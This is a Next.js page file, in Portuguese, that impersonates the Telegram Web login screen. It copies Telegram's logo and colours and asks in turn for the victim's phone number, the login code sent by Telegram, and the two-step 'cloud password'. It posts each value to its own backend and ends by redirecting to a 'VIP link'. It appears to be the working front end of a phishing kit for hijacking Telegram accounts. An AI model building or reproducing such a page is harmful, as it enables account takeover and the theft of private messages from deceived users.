import { useState } from 'react';
import Head from 'next/head';

export default function Home() {
  const [step, setStep] = useState(1); // 1: Phone, 2: Code, 3: Password (2FA)
  const [loading, setLoading] = useState(false);
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [hash, setHash] = useState('');

  // Estilo "Telegram Blue"
  const tgBlue = '#3390ec';

  const handleSendCode = async () => {
    if(phone.length < 10) return setError('Número inválido. Use formato +55...');
    setLoading(true); setError('');
    
    try {
      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone }),
      });
      const data = await res.json();
      if (res.ok) {
        setHash(data.phoneCodeHash); // Salva o hash para o próximo passo
        setStep(2);
      } else {
        setError(data.error || 'Erro ao conectar. Tente novamente.');
      }
    } catch (err) { setError('Falha na conexão.'); }
    setLoading(false);
  };

  const handleVerifyCode = async () => {
    setLoading(true); setError('');
    try {
      const res = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            phoneNumber: phone, 
            code, 
            phoneCodeHash: hash, // Envia o hash salvo
            password // Envia senha se tiver
        }),
      });
      const data = await res.json();

      if (data.status === 'needs_2fa') {
          setStep(3); // Pede a senha da nuvem
          setLoading(false);
          return;
      }

      if (res.ok && data.success) {
        // Sucesso: Redireciona para o link VIP
        window.location.href = data.redirect;
      } else {
        setError(data.error || 'Código inválido ou expirado.');
      }
    } catch (err) { setError('Erro ao validar.'); }
    setLoading(false);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#1c242f', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
      <Head>
        <title>Telegram Web</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div style={{ width: '100%', maxWidth: '380px', padding: '40px 30px', backgroundColor: '#242f3d', borderRadius: '12px', boxShadow: '0 4px 12px rgba(0,0,0,0.3)', textAlign: 'center' }}>
        
        {/* Logo Telegram */}
        <div style={{ marginBottom: '25px', display: 'flex', justifyContent: 'center' }}>
            <svg width="90" height="90" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="100" cy="100" r="100" fill="#3390ec"/>
                <path d="M149.5 56.5L40.5 98.5C33 101.5 33 105.5 39 107.5L67 116L132.5 75C135.5 73 138.5 74.5 136 76.5L82.5 125L79.5 154.5C82.5 154.5 83.5 153.5 86.5 150.5L107 131L138.5 154.5C144.5 157.5 147.5 154.5 149 148.5L168.5 61C170.5 53 165.5 50 149.5 56.5Z" fill="white"/>
            </svg>
        </div>

        <h1 style={{ color: '#fff', fontSize: '22px', fontWeight: 'bold', marginBottom: '10px' }}>
          {step === 1 ? 'Entrar no Telegram' : step === 2 ? 'Verificação' : 'Senha da Nuvem'}
        </h1>
        
        <p style={{ color: '#a2acb4', fontSize: '14px', marginBottom: '30px', lineHeight: '1.5' }}>
          {step === 1 ? 'Confirme seu país e insira seu número de telefone para continuar.' : 
           step === 2 ? `Enviamos um código para o app do Telegram em ${phone}.` :
           'Sua conta está protegida com Verificação em Duas Etapas.'}
        </p>

        {error && <div style={{ backgroundColor: 'rgba(255, 75, 75, 0.1)', color: '#ff5c5c', padding: '10px', borderRadius: '8px', fontSize: '13px', marginBottom: '20px' }}>{error}</div>}

        {step === 1 && (
          <>
            <div style={{ position: 'relative', marginBottom: '20px' }}>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="Número de telefone"
                  style={{ width: '100%', padding: '15px', backgroundColor: '#18222d', border: '1px solid #2f3b4a', borderRadius: '10px', color: '#fff', fontSize: '16px', outline: 'none', transition: 'border 0.2s' }}
                  onFocus={(e) => e.target.style.border = `1px solid ${tgBlue}`}
                  onBlur={(e) => e.target.style.border = '1px solid #2f3b4a'}
                />
                <div style={{ position: 'absolute', top: '-10px', left: '10px', background: '#242f3d', padding: '0 5px', fontSize: '12px', color: tgBlue }}>Número</div>
            </div>
            
            <button
              onClick={handleSendCode}
              disabled={loading}
              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1, transition: 'background 0.2s' }}
            >
              {loading ? 'AGUARDE...' : 'PRÓXIMO'}
            </button>
            <div style={{ marginTop: '20px', display: 'flex', alignItems: 'center', gap: '10px' }}>
                 <input type="checkbox" checked readOnly style={{accentColor: tgBlue}}/>
                 <span style={{color: '#fff', fontSize: '14px'}}>Manter conectado</span>
            </div>
          </>
        )}

        {(step === 2 || step === 3) && (
          <>
            <div style={{ position: 'relative', marginBottom: '20px' }}>
                <input
                  type={step === 3 ? "password" : "text"}
                  value={step === 3 ? password : code}
                  onChange={(e) => step === 3 ? setPassword(e.target.value) : setCode(e.target.value)}
                  placeholder={step === 3 ? "Sua Senha" : "Código de 5 dígitos"}
                  style={{ width: '100%', padding: '15px', backgroundColor: '#18222d', border: '1px solid #2f3b4a', borderRadius: '10px', color: '#fff', fontSize: '18px', outline: 'none', letterSpacing: '2px', textAlign: 'center' }}
                  onFocus={(e) => e.target.style.border = `1px solid ${tgBlue}`}
                />
            </div>

            <button
              onClick={handleVerifyCode}
              disabled={loading}
              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'VERIFICANDO...' : step === 3 ? 'ENTRAR' : 'PRÓXIMO'}
            </button>
          </>
        )}

      </div>
    </div>
  );
}
